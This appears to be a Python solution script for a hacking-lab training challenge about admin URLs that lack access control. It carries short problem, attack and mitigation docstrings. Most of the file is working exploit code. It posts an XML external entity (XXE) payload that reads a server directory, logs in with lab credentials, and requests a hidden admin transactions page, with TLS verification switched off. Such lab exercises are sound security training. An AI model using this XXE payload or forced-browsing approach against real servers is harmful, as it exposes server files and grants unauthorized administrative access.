__problem__ = \
"""
Server doesn't show admin urls publicly. But the URLs are not restricted either.'
"""

__attack__ = \
"""
Find the possible paths with exploit of challenge 6. Server was written in Java so it is pretty simple. Trial and error until the correct path is found.
"""

__mitigation__ = \
"""
Role concepts for URLs.
"""

import logging

import requests

from __base__ import setup_log

log = logging.getLogger(__name__)


def admin_panel():
    with requests.session() as session:
        session.verify = False
        session.get("https://glocken.hacking-lab.com/12001/xpath_case0/")
        response = session.post("http://glocken.hacking-lab.com/12001/ws_case2/ws2/xmlsearch",
                     data="""
                     <?xml version="1.0" encoding="ISO-8"?>
                          <!DOCTYPE foo [
                          <!ELEMENT foo ANY >
                          <!ENTITY xxe SYSTEM "file:///opt/applic/tomcat/webapps/xpath0/">]>
                          <query>
                            <result-limit>1</result-limit>
                            <bell-name>foo</bell-name>
                            <bell-description>&xxe;</bell-description>
                          </query>
                     """)
        print(response.text)
        response = session.post("https://glocken.hacking-lab.com/12001/xpath_case0/auth_xpath0/login",
                                data={
                                    'username': 'hacker10',
                                    'password': "compass",
                                    'action': 'login',
                                    'originalURL': 'https%3A%2F%2Fglocken.hacking-lab.com%2F12001%2Fxpath_case0%2Fxpath0%2Fcontroller%3Faction%3Dprofile',
                                    'send': 'Login',
                                })
        response = session.get("https://glocken.hacking-lab.com/12001/xpath_case0/admin/showtransactions")
        print(response.text)


if __name__ == '__main__':
    setup_log()
    admin_panel()
